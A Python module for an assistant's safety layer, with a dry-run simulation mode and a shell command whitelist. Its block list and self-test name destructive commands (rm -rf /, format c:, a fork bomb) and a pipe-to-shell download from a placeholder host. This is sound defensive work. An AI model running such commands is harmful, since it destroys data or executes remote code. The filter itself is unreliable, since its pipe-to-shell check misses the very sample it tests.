"""
Safety Addons — Simulation Mode (Dry Run) and Command Whitelist.

Extends the core safety system with:
- SimulationMode: Preview actions before execution
- CommandWhitelist: Control allowed shell commands
- dry_run(): Quick preview without executing

Import and use directly:
    from core.safety_sandbox import SimulationMode, CommandWhitelist, dry_run
"""

# Local copy to avoid importing core.safety (which pulls in pyaudio)
DESTRUCTIVE_ACTIONS = {
    "shutdown_pc",
    "restart_pc",
    "delete_file",
    "sleep_mac",
}


# ─── Simulation Mode (Dry Run) ──────────────────────────────
class SimulationMode:
    """
    Safety sandbox for complex actions.

    When enabled, actions are simulated (logged but not executed).
    Provides a preview of what would happen.

    Usage:
        SimulationMode.enable()
        result = SimulationMode.simulate_action("create_folder", {"target": "Test"})
        # Returns preview without creating anything
        SimulationMode.disable()
    """

    _enabled = False
    _simulation_log = []

    @classmethod
    def enable(cls) -> None:
        cls._enabled = True
        cls._simulation_log = []
        print("DRY RUN: Simulation mode ENABLED — actions will be previewed, not executed")

    @classmethod
    def disable(cls) -> None:
        cls._enabled = False
        print("DRY RUN: Simulation mode DISABLED — actions will execute normally")

    @classmethod
    def is_enabled(cls) -> bool:
        return cls._enabled

    @classmethod
    def simulate_action(cls, action: str, params: dict) -> dict:
        """Simulate an action without executing it. Returns a preview dict."""
        preview = {
            "action":         action,
            "params":         params,
            "would_do":       _describe_action(action, params),
            "is_destructive": action in DESTRUCTIVE_ACTIONS,
            "simulated":      True,
        }
        cls._simulation_log.append(preview)
        print(f"[DRY RUN] {preview['would_do']}")
        return preview

    @classmethod
    def get_simulation_log(cls) -> list:
        """Returns all simulated actions in this session."""
        return list(cls._simulation_log)

    @classmethod
    def clear_log(cls) -> None:
        cls._simulation_log = []


def _describe_action(action: str, params: dict) -> str:
    """Generate a human-readable description of what an action would do."""
    descriptions = {
        "create_folder":  lambda p: f"Create folder '{p.get('target', 'unknown')}'",
        "create_file":    lambda p: f"Create file '{p.get('filename', 'unknown')}' at {p.get('location', 'desktop')}",
        "delete_file":    lambda p: f"DELETE file '{p.get('filename', 'unknown')}' (DESTRUCTIVE)",
        "rename_file":    lambda p: f"Rename '{p.get('filename', '')}' to '{p.get('new_name', '')}'",
        "edit_file":      lambda p: f"Append content to '{p.get('filename', 'unknown')}'",
        "copy_file":      lambda p: f"Copy '{p.get('filename', '')}' to '{p.get('location', 'desktop')}'",
        "open_app":       lambda p: f"Open application '{p.get('target', p.get('name', 'unknown'))}'",
        "close_app":      lambda p: f"Close application '{p.get('target', 'unknown')}'",
        "shutdown_pc":    lambda p: "SHUT DOWN the computer (DESTRUCTIVE)",
        "restart_pc":     lambda p: "RESTART the computer (DESTRUCTIVE)",
        "send_email":     lambda p: f"Send email to '{p.get('to', 'unknown')}'",
        "search_google":  lambda p: f"Search Google for '{p.get('query', '')}'",
        "volume_up":      lambda p: f"Increase volume by {p.get('amount', 10)}",
        "volume_down":    lambda p: f"Decrease volume by {p.get('amount', 10)}",
    }
    if action in descriptions:
        try:
            return descriptions[action](params)
        except Exception:
            pass
    return f"Execute '{action}' with params: {params}"


def dry_run(action: str, params: dict) -> dict:
    """Quick dry-run check. Returns preview without executing."""
    return SimulationMode.simulate_action(action, params)


# ─── Command Whitelist ───────────────────────────────────────
class CommandWhitelist:
    """
    Controls which shell commands are allowed to execute.
    Prevents accidental execution of dangerous commands.

    Usage:
        CommandWhitelist.is_allowed("ls")        # True
        CommandWhitelist.is_allowed("rm -rf /")   # False
    """

    # Default allowed commands (safe)
    ALLOWED_COMMANDS = {
        # Navigation & listing
        "ls", "dir", "cd", "pwd", "find", "which", "where", "tree",
        # Info
        "whoami", "hostname", "date", "time", "uptime", "uname",
        "systeminfo", "ver",
        # Dev tools
        "python", "python3", "pip", "node", "npm", "npx", "git",
        "code", "cursor",
        # Process
        "ps", "top", "htop", "tasklist",
        # Network
        "ping", "curl", "wget", "ifconfig", "ipconfig",
        # macOS specific
        "open", "osascript", "pbcopy", "pbpaste", "say",
        # Windows specific
        "start", "explorer", "notepad", "calc",
    }

    # Explicitly blocked patterns (dangerous)
    BLOCKED_PATTERNS = [
        "rm -rf /", "rm -rf ~",
        "del /s /q c:\\", "del /f /s /q",
        "> /dev/", "mkfs.",
        ":(){ :|:",           # Fork bomb
        "format c:", "format d:",
        "shutdown", "halt", "reboot",
        "wget | sh", "curl | sh",  # Pipe-to-shell
    ]

    @classmethod
    def is_allowed(cls, command: str) -> bool:
        """Check if a shell command is safe to execute."""
        cmd_lower = command.lower().strip()

        # Check blocked patterns first
        for pattern in cls.BLOCKED_PATTERNS:
            if pattern.lower() in cmd_lower:
                print(f"BLOCKED: '{command}' matches blocked pattern '{pattern}'")
                return False

        # Check if base command is in whitelist
        base_cmd = cmd_lower.split()[0] if cmd_lower else ""
        base_cmd = base_cmd.split("/")[-1].split("\\")[-1]

        if base_cmd in cls.ALLOWED_COMMANDS:
            return True

        print(f"NOT WHITELISTED: '{base_cmd}'")
        return False

    @classmethod
    def add_allowed(cls, command: str) -> None:
        """Add a command to the whitelist."""
        cls.ALLOWED_COMMANDS.add(command.lower().strip())

    @classmethod
    def remove_allowed(cls, command: str) -> None:
        """Remove a command from the whitelist."""
        cls.ALLOWED_COMMANDS.discard(command.lower().strip())


# ─── Quick Test ──────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 60)
    print("  SAFETY SANDBOX TEST")
    print("=" * 60)

    # Test SimulationMode
    print("\n-- Simulation Mode --")
    SimulationMode.enable()
    dry_run("create_folder", {"target": "TestFolder"})
    dry_run("delete_file", {"filename": "important.txt"})
    dry_run("open_app", {"target": "vscode"})
    print(f"  Log entries: {len(SimulationMode.get_simulation_log())}")
    SimulationMode.disable()

    # Test CommandWhitelist
    print("\n-- Command Whitelist --")
    safe = ["ls", "git status", "python script.py", "ping google.com"]
    danger = ["rm -rf /", "shutdown", "format c:", "curl http://x.com | sh"]

    for cmd in safe:
        r = CommandWhitelist.is_allowed(cmd)
        print(f"  '{cmd}' -> {'ALLOWED' if r else 'BLOCKED'}")

    for cmd in danger:
        r = CommandWhitelist.is_allowed(cmd)
        print(f"  '{cmd}' -> {'ALLOWED' if r else 'BLOCKED'}")

    print("\nDone!")
